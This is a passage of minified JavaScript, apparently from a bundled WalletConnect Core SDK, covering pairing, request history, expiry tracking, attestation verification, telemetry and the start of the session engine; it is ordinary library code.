Error(n)}if(xf(this.pairings.get(i).expiry)){await this.deletePairing(i);const{message:n}=ot("EXPIRED",`pairing topic: ${i}`);throw new Error(n)}}),this.core=e,this.logger=gr(t,this.name),this.pairings=new C2(this.core,this.logger,this.name,this.storagePrefix)}get context(){return Or(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(Fs.message,async e=>{const{topic:t,message:i,transportType:n}=e;if(this.pairings.keys.includes(t)&&n!==fn.link_mode&&!this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(i)))try{const s=await this.core.crypto.decode(t,i);N0(s)?(this.core.history.set(t,s),await this.onRelayEventRequest({topic:t,payload:s})):Jd(s)&&(await this.core.history.resolve(s),await this.onRelayEventResponse({topic:t,payload:s}),this.core.history.delete(t,s.id)),await this.core.relayer.messages.ack(t,i)}catch(s){this.logger.error(s)}})}registerExpirerEvents(){this.core.expirer.on(Gc.expired,async e=>{const{topic:t}=are(e.target);t&&this.pairings.keys.includes(t)&&(await this.deletePairing(t,!0),this.events.emit(l1.expire,{topic:t}))})}};var ZVe=Object.defineProperty,YVe=(r,e,t)=>e in r?ZVe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Qs=(r,e,t)=>YVe(r,typeof e!="symbol"?e+"":e,t);let JVe=class extends vze{constructor(e,t){super(e,t),this.core=e,this.logger=t,Qs(this,"records",new Map),Qs(this,"events",new en.EventEmitter),Qs(this,"name",Xze),Qs(this,"version",eWe),Qs(this,"cached",[]),Qs(this,"initialized",!1),Qs(this,"storagePrefix",Hd),Qs(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(i=>this.records.set(i.id,i)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),Qs(this,"set",(i,n,s)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:i,request:n,chainId:s}),this.records.has(n.id))return;const o={id:n.id,topic:i,request:{method:n.method,params:n.params||null},chainId:s,expiry:ws(fe.THIRTY_DAYS)};this.records.set(o.id,o),this.persist(),this.events.emit(zl.created,o)}),Qs(this,"resolve",async i=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:i}),!this.records.has(i.id))return;const n=await this.getRecord(i.id);typeof n.response>"u"&&(n.response=wi(i)?{error:i.error}:{result:i.result},this.records.set(n.id,n),this.persist(),this.events.emit(zl.updated,n))}),Qs(this,"get",async(i,n)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:i,id:n}),await this.getRecord(n))),Qs(this,"delete",(i,n)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:n}),this.values.forEach(s=>{if(s.topic===i){if(typeof n<"u"&&s.id!==n)return;this.records.delete(s.id),this.events.emit(zl.deleted,s)}}),this.persist()}),Qs(this,"exists",async(i,n)=>(this.isInitialized(),this.records.has(n)?(await this.getRecord(n)).topic===i:!1)),Qs(this,"on",(i,n)=>{this.events.on(i,n)}),Qs(this,"once",(i,n)=>{this.events.once(i,n)}),Qs(this,"off",(i,n)=>{this.events.off(i,n)}),Qs(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(t=>{if(typeof t.response<"u")return;const i={topic:t.topic,request:jn(t.request.method,t.request.params,t.id),chainId:t.chainId};return e.push(i)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const t=this.records.get(e);if(!t){const{message:i}=ot("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(i)}return t}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(zl.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:t}=ot("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(zl.created,e=>{const t=zl.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.events.on(zl.updated,e=>{const t=zl.updated;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.events.on(zl.deleted,e=>{const t=zl.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.core.heartbeat.on(Ks.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(t=>{fe.toMiliseconds(t.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${t.id}`),this.records.delete(t.id),this.events.emit(zl.deleted,t,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}};var QVe=Object.defineProperty,XVe=(r,e,t)=>e in r?QVe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,To=(r,e,t)=>XVe(r,typeof e!="symbol"?e+"":e,t);let eKe=class extends Sze{constructor(e,t){super(e,t),this.core=e,this.logger=t,To(this,"expirations",new Map),To(this,"events",new en.EventEmitter),To(this,"name",tWe),To(this,"version",rWe),To(this,"cached",[]),To(this,"initialized",!1),To(this,"storagePrefix",Hd),To(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(i=>this.expirations.set(i.target,i)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),To(this,"has",i=>{try{const n=this.formatTarget(i);return typeof this.getExpiration(n)<"u"}catch{return!1}}),To(this,"set",(i,n)=>{this.isInitialized();const s=this.formatTarget(i),o={target:s,expiry:n};this.expirations.set(s,o),this.checkExpiry(s,o),this.events.emit(Gc.created,{target:s,expiration:o})}),To(this,"get",i=>{this.isInitialized();const n=this.formatTarget(i);return this.getExpiration(n)}),To(this,"del",i=>{if(this.isInitialized(),this.has(i)){const n=this.formatTarget(i),s=this.getExpiration(n);this.expirations.delete(n),this.events.emit(Gc.deleted,{target:n,expiration:s})}}),To(this,"on",(i,n)=>{this.events.on(i,n)}),To(this,"once",(i,n)=>{this.events.once(i,n)}),To(this,"off",(i,n)=>{this.events.off(i,n)}),To(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return gUe(e);if(typeof e=="number")return mUe(e);const{message:t}=ot("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(t)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(Gc.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:t}=ot("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const t=this.expirations.get(e);if(!t){const{message:i}=ot("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(i),new Error(i)}return t}checkExpiry(e,t){const{expiry:i}=t;fe.toMiliseconds(i)-Date.now()<=0&&this.expire(e,t)}expire(e,t){this.expirations.delete(e),this.events.emit(Gc.expired,{target:e,expiration:t})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,t)=>this.checkExpiry(t,e))}registerEventListeners(){this.core.heartbeat.on(Ks.pulse,()=>this.checkExpirations()),this.events.on(Gc.created,e=>{const t=Gc.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()}),this.events.on(Gc.expired,e=>{const t=Gc.expired;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()}),this.events.on(Gc.deleted,e=>{const t=Gc.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}};var tKe=Object.defineProperty,rKe=(r,e,t)=>e in r?tKe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,is=(r,e,t)=>rKe(r,typeof e!="symbol"?e+"":e,t);let iKe=class extends Aze{constructor(e,t,i){super(e,t,i),this.core=e,this.logger=t,this.store=i,is(this,"name",iWe),is(this,"abortController"),is(this,"isDevEnv"),is(this,"verifyUrlV3",sWe),is(this,"storagePrefix",Hd),is(this,"version",tie),is(this,"publicKey"),is(this,"fetchPromise"),is(this,"init",async()=>{var n;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&fe.toMiliseconds((n=this.publicKey)==null?void 0:n.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))}),is(this,"register",async n=>{if(!L3()||this.isDevEnv)return;const s=window.location.origin,{id:o,decryptedId:a}=n,c=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${s}&id=${o}&decryptedId=${a}`;try{const l=vn.getDocument(),u=this.startAbortTimer(fe.ONE_SECOND*5),d=await new Promise((h,f)=>{const p=()=>{window.removeEventListener("message",w),l.body.removeChild(g),f("attestation aborted")};this.abortController.signal.addEventListener("abort",p);const g=l.createElement("iframe");g.src=c,g.style.display="none",g.addEventListener("error",p,{signal:this.abortController.signal});const w=m=>{if(m.data&&typeof m.data=="string")try{const x=JSON.parse(m.data);if(x.type==="verify_attestation"){if(u0(x.attestation).payload.id!==o)return;clearInterval(u),l.body.removeChild(g),this.abortController.signal.removeEventListener("abort",p),window.removeEventListener("message",w),h(x.attestation===null?"":x.attestation)}}catch(x){this.logger.warn(x)}};l.body.appendChild(g),window.addEventListener("message",w,{signal:this.abortController.signal})});return this.logger.debug("jwt attestation",d),d}catch(l){this.logger.warn(l)}return""}),is(this,"resolve",async n=>{if(this.isDevEnv)return"";const{attestationId:s,hash:o,encryptedId:a}=n;if(s===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(s){if(u0(s).payload.id!==a)return;const l=await this.isValidJwtAttestation(s);if(l){if(!l.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return l}}if(!o)return;const c=this.getVerifyUrl(n?.verifyUrl);return this.fetchAttestation(o,c)}),is(this,"fetchAttestation",async(n,s)=>{this.logger.debug(`resolving attestation: ${n} from url: ${s}`);const o=this.startAbortTimer(fe.ONE_SECOND*5),a=await fetch(`${s}/attestation/${n}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(o),a.status===200?await a.json():void 0}),is(this,"getVerifyUrl",n=>{let s=n||q5;return oWe.includes(s)||(this.logger.info(`verify url: ${s}, not included in trusted list, assigning default: ${q5}`),s=q5),s}),is(this,"fetchPublicKey",async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const n=this.startAbortTimer(fe.FIVE_SECONDS),s=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(n),await s.json()}catch(n){this.logger.warn(n)}}),is(this,"persistPublicKey",async n=>{this.logger.debug("persisting public key to local storage",n),await this.store.setItem(this.storeKey,n),this.publicKey=n}),is(this,"removePublicKey",async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0}),is(this,"isValidJwtAttestation",async n=>{const s=await this.getPublicKey();try{if(s)return this.validateAttestation(n,s)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}const o=await this.fetchAndPersistPublicKey();try{if(o)return this.validateAttestation(n,o)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}}),is(this,"getPublicKey",async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey()),is(this,"fetchAndPersistPublicKey",async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async s=>{const o=await this.fetchPublicKey();o&&(await this.persistPublicKey(o),s(o))});const n=await this.fetchPromise;return this.fetchPromise=void 0,n}),is(this,"validateAttestation",(n,s)=>{const o=uqe(n,s.publicKey),a={hasExpired:fe.toMiliseconds(o.exp)<Date.now(),payload:o};if(a.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:a.payload.origin,isScam:a.payload.isScam,isVerified:a.payload.isVerified}}),this.logger=gr(t,this.name),this.abortController=new AbortController,this.isDevEnv=vO(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return Or(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),fe.toMiliseconds(e))}};var nKe=Object.defineProperty,sKe=(r,e,t)=>e in r?nKe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,QW=(r,e,t)=>sKe(r,typeof e!="symbol"?e+"":e,t);let oKe=class extends Ize{constructor(e,t){super(e,t),this.projectId=e,this.logger=t,QW(this,"context",aWe),QW(this,"registerDeviceToken",async i=>{const{clientId:n,token:s,notificationType:o,enableEncrypted:a=!1}=i,c=`${cWe}/${this.projectId}/clients`;await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:n,type:o,token:s,always_raw:a})})}),this.logger=gr(t,this.context)}};var aKe=Object.defineProperty,XW=Object.getOwnPropertySymbols,cKe=Object.prototype.hasOwnProperty,lKe=Object.prototype.propertyIsEnumerable,HN=(r,e,t)=>e in r?aKe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Db=(r,e)=>{for(var t in e||(e={}))cKe.call(e,t)&&HN(r,t,e[t]);if(XW)for(var t of XW(e))lKe.call(e,t)&&HN(r,t,e[t]);return r},Ps=(r,e,t)=>HN(r,typeof e!="symbol"?e+"":e,t);let uKe=class extends Tze{constructor(e,t,i=!0){super(e,t,i),this.core=e,this.logger=t,Ps(this,"context",uWe),Ps(this,"storagePrefix",Hd),Ps(this,"storageVersion",lWe),Ps(this,"events",new Map),Ps(this,"shouldPersist",!1),Ps(this,"init",async()=>{if(!vO())try{const n={eventId:Fz(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:sre(this.core.relayer.protocol,this.core.relayer.version,DN)}}};await this.sendEvent([n])}catch(n){this.logger.warn(n)}}),Ps(this,"createEvent",n=>{const{event:s="ERROR",type:o="",properties:{topic:a,trace:c}}=n,l=Fz(),u=this.core.projectId||"",d=Date.now(),h=Db({eventId:l,timestamp:d,props:{event:s,type:o,properties:{topic:a,trace:c}},bundleId:u,domain:this.getAppDomain()},this.setMethods(l));return this.telemetryEnabled&&(this.events.set(l,h),this.shouldPersist=!0),h}),Ps(this,"getEvent",n=>{const{eventId:s,topic:o}=n;if(s)return this.events.get(s);const a=Array.from(this.events.values()).find(c=>c.props.properties.topic===o);if(a)return Db(Db({},a),this.setMethods(a.eventId))}),Ps(this,"deleteEvent",n=>{const{eventId:s}=n;this.events.delete(s),this.shouldPersist=!0}),Ps(this,"setEventListeners",()=>{this.core.heartbeat.on(Ks.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(n=>{fe.fromMiliseconds(Date.now())-fe.fromMiliseconds(n.timestamp)>dWe&&(this.events.delete(n.eventId),this.shouldPersist=!0)})})}),Ps(this,"setMethods",n=>({addTrace:s=>this.addTrace(n,s),setError:s=>this.setError(n,s)})),Ps(this,"addTrace",(n,s)=>{const o=this.events.get(n);o&&(o.props.properties.trace.push(s),this.events.set(n,o),this.shouldPersist=!0)}),Ps(this,"setError",(n,s)=>{const o=this.events.get(n);o&&(o.props.type=s,o.timestamp=Date.now(),this.events.set(n,o),this.shouldPersist=!0)}),Ps(this,"persist",async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1}),Ps(this,"restore",async()=>{try{const n=await this.core.storage.getItem(this.storageKey)||[];if(!n.length)return;n.forEach(s=>{this.events.set(s.eventId,Db(Db({},s),this.setMethods(s.eventId)))})}catch(n){this.logger.warn(n)}}),Ps(this,"submit",async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const n=[];for(const[s,o]of this.events)o.props.type&&n.push(o);if(n.length!==0)try{if((await this.sendEvent(n)).ok)for(const s of n)this.events.delete(s.eventId),this.shouldPersist=!0}catch(s){this.logger.warn(s)}}),Ps(this,"sendEvent",async n=>{const s=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${hWe}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${DN}${s}`,{method:"POST",body:JSON.stringify(n)})}),Ps(this,"getAppDomain",()=>nre().url),this.logger=gr(t,this.context),this.telemetryEnabled=i,i?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}};var dKe=Object.defineProperty,eH=Object.getOwnPropertySymbols,hKe=Object.prototype.hasOwnProperty,fKe=Object.prototype.propertyIsEnumerable,VN=(r,e,t)=>e in r?dKe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,tH=(r,e)=>{for(var t in e||(e={}))hKe.call(e,t)&&VN(r,t,e[t]);if(eH)for(var t of eH(e))fKe.call(e,t)&&VN(r,t,e[t]);return r},rn=(r,e,t)=>VN(r,typeof e!="symbol"?e+"":e,t);let pKe=class mie extends gze{constructor(e){var t;super(e),rn(this,"protocol",eie),rn(this,"version",tie),rn(this,"name",MN),rn(this,"relayUrl"),rn(this,"projectId"),rn(this,"customStoragePrefix"),rn(this,"events",new en.EventEmitter),rn(this,"logger"),rn(this,"heartbeat"),rn(this,"relayer"),rn(this,"crypto"),rn(this,"storage"),rn(this,"history"),rn(this,"expirer"),rn(this,"pairing"),rn(this,"verify"),rn(this,"echoClient"),rn(this,"linkModeSupportedApps"),rn(this,"eventClient"),rn(this,"initialized",!1),rn(this,"logChunkController"),rn(this,"on",(a,c)=>this.events.on(a,c)),rn(this,"once",(a,c)=>this.events.once(a,c)),rn(this,"off",(a,c)=>this.events.off(a,c)),rn(this,"removeListener",(a,c)=>this.events.removeListener(a,c)),rn(this,"dispatchEnvelope",({topic:a,message:c,sessionExists:l})=>{if(!a||!c)return;const u={topic:a,message:c,publishedAt:Date.now(),transportType:fn.link_mode};this.relayer.onLinkMessageEvent(u,{sessionExists:l})});const i=this.getGlobalCore(e?.customStoragePrefix);if(i)try{return this.customStoragePrefix=i.customStoragePrefix,this.logger=i.logger,this.heartbeat=i.heartbeat,this.crypto=i.crypto,this.history=i.history,this.expirer=i.expirer,this.storage=i.storage,this.relayer=i.relayer,this.pairing=i.pairing,this.verify=i.verify,this.echoClient=i.echoClient,this.linkModeSupportedApps=i.linkModeSupportedApps,this.eventClient=i.eventClient,this.initialized=i.initialized,this.logChunkController=i.logChunkController,i}catch(a){console.warn("Failed to copy global core",a)}this.projectId=e?.projectId,this.relayUrl=e?.relayUrl||iie,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const n=ra({level:typeof e?.logger=="string"&&e.logger?e.logger:Oze.logger,name:MN}),{logger:s,chunkLoggerController:o}=_3({opts:n,maxSizeInBytes:e?.maxLogBlobSizeInBytes,loggerOverride:e?.logger});this.logChunkController=o,(t=this.logChunkController)!=null&&t.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var a,c;(a=this.logChunkController)!=null&&a.downloadLogsBlobInBrowser&&((c=this.logChunkController)==null||c.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=gr(s,this.name),this.heartbeat=new Z$,this.crypto=new FHe(this,this.logger,e?.keychain),this.history=new JVe(this,this.logger),this.expirer=new eKe(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new Y$(tH(tH({},Bze),e?.storageOptions)),this.relayer=new pVe({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new GVe(this,this.logger),this.verify=new iKe(this,this.logger,this.storage),this.echoClient=new oKe(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new uKe(this,this.logger,e?.telemetryEnabled),this.setGlobalCore(this)}static async init(e){const t=new mie(e);await t.initialize();const i=await t.crypto.getClientId();return await t.storage.setItem(Gze,i),t}get context(){return Or(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(OW,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(OW)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`,e),this.logger.error(e.message),e}}getGlobalCore(e=""){try{if(this.isGlobalCoreDisabled())return;const t=`_walletConnectCore_${e}`,i=`${t}_count`;return globalThis[i]=(globalThis[i]||0)+1,globalThis[i]>1&&console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[i]} times.`),globalThis[t]}catch(t){console.warn("Failed to get global WalletConnect core",t);return}}setGlobalCore(e){var t;try{if(this.isGlobalCoreDisabled())return;const i=`_walletConnectCore_${((t=e.opts)==null?void 0:t.customStoragePrefix)||""}`;globalThis[i]=e}catch(i){console.warn("Failed to set global WalletConnect core",i)}}isGlobalCoreDisabled(){try{return typeof process<"u"&&Rze.DISABLE_GLOBAL_CORE==="true"}catch{return!0}}};const gKe=pKe,wie="wc",bie=2,vie="client",RO=`${wie}@${bie}:${vie}:`,mI={name:vie,logger:"error"},rH="WALLETCONNECT_DEEPLINK_CHOICE",mKe="proposal",iH="Proposal expired",wKe="session",G2=fe.SEVEN_DAYS,bKe="engine",$s={wc_sessionPropose:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1104},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1106},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1112},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1114},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:fe.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:fe.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1119}}},wI={min:fe.FIVE_MINUTES,max:fe.SEVEN_DAYS},Vu={idle:"IDLE",active:"ACTIVE"},vKe={eth_sendTransaction:{key:""},eth_sendRawTransaction:{key:""},wallet_sendCalls:{key:""},solana_signTransaction:{key:"signature"},solana_signAllTransactions:{key:"transactions"},solana_signAndSendTransaction:{key:"signature"},sui_signAndExecuteTransaction:{key:"digest"},sui_signTransaction:{key:""},hedera_signAndExecuteTransaction:{key:"transactionId"},hedera_executeTransaction:{key:"transactionId"},near_signTransaction:{key:""},near_signTransactions:{key:""},tron_signTransaction:{key:"txID"},xrpl_signTransaction:{key:""},xrpl_signTransactionFor:{key:""},algo_signTxn:{key:""},sendTransfer:{key:"txid"},stacks_stxTransfer:{key:"txId"},polkadot_signTransaction:{key:""},cosmos_signDirect:{key:""}},yKe="request",xKe=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],CKe="wc",EKe="auth",_Ke="authKeys",SKe="pairingTopics",AKe="requests",rE=`${CKe}@${1.5}:${EKe}:`,C9=`${rE}:PUB_KEY`;var IKe=Object.defineProperty,TKe=Object.defineProperties,kKe=Object.getOwnPropertyDescriptors,nH=Object.getOwnPropertySymbols,NKe=Object.prototype.hasOwnProperty,PKe=Object.prototype.propertyIsEnumerable,KN=(r,e,t)=>e in r?IKe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,un=(r,e)=>{for(var t in e||(e={}))NKe.call(e,t)&&KN(r,t,e[t]);if(nH)for(var t of nH(e))PKe.call(e,t)&&KN(r,t,e[t]);return r},ca=(r,e)=>TKe(r,kKe(e)),Fe=(r,e,t)=>KN(r,typeof e!="symbol"?e+"":e,t);let $Ke=class extends $ze{constructor(e){super(e),Fe(this,"name",bKe),Fe(this,"events",new T0),Fe(this,"initialized",!1),Fe(this,"requestQueue",{state:Vu.idle,queue:[]}),Fe(this,"sessionRequestQueue",{state:Vu.idle,queue:[]}),Fe(this,"emittedSessionRequests",new SUe({limit:500})),Fe(this,"requestQueueDelay",fe.ONE_SECOND),Fe(this,"expectedPairingMethodMap",new Map),Fe(this,"recentlyDeletedMap",new Map),Fe(this,"recentlyDeletedLimit",200),Fe(this,"relayMessageCache",[]),Fe(this,"pendingSessions",new Map),Fe(this,"init",async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys($s)}),this.initialized=!0,setTimeout(async()=>{await this.processPendingMessageEvents(),this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},fe.toMiliseconds(this.requestQueueDelay)))}),Fe(this,"connect",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();const i=ca(un({},t),{requiredNamespaces:t.requiredNamespaces||{},optionalNamespaces:t.optionalNamespaces||{}});await this.isValidConnect(i),i.optionalNamespaces=Aqe(i.requiredNamespaces,i.optionalNamespaces),i.requiredNamespaces={};const{pairingTopic:n,requiredNamespaces:s,optionalNamespaces:o,sessionProperties:a,scopedProperties:c,relays:l}=i;let u=n,d,h=!1;try{if(u){const I=this.client.core.pairing.pairings.get(u);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),h=I.active}}catch(I){throw this.client.logger.error(`connect() -> pairing.get(${u}) failed`),I}if(!u||!h){const{topic:I,uri:E}=await this.client.core.pairing.create();u=I,d=E}if(!u){const{message:I}=ot("NO_MATCHING_KEY",`connect() pairing topic: ${u}`);throw new Error(I)}const f=await this.client.core.crypto.generateKeyPair(),p=$s.wc_sessionPropose.req.ttl||fe.FIVE_MINUTES,g=ws(p),w=ca(un(un({requiredNamespaces:s,optionalNamespaces:o,relays:l??[{protocol:rie}],proposer:{publicKey:f,metadata:this.client.metadata},expiryTimestamp:g,pairingTopic:u},a&&{sessionProperties:a}),c&&{scopedProperties:c}),{id:mn()}),m=Ni("session_connect",w.id),{reject:x,resolve:S,done:T}=t1(p,iH),k=({id:I})=>{I===w.id&&(this.client.events.off("proposal_expire",k),this.pendingSessions.delete(w.id),this.events.emit(m,{error:{message:iH,code:0}}))};return this.client.events.on("proposal_expire",k),this.events.once(m,({error:I,session:E})=>{this.client.events.off("proposal_expire",k),I?x(I):E&&S(E)}),await this.sendRequest({topic:u,method:"wc_sessionPropose",params:w,throwOnFailedPublish:!0,clientRpcId:w.id}),await this.setProposal(w.id,w),{uri:d,approval:T}}),Fe(this,"pair",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(t)}catch(i){throw this.client.logger.error("pair() failed"),i}}),Fe(this,"approve",async t=>{var i,n,s;const o=this.client.core.eventClient.createEvent({properties:{topic:(i=t?.id)==null?void 0:i.toString(),trace:[Wl.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(N){throw o.setError(Kp.no_internet_connection),N}try{await this.isValidProposalId(t?.id)}catch(N){throw this.client.logger.error(`approve() -> proposal.get(${t?.id}) failed`),o.setError(Kp.proposal_not_found),N}try{await 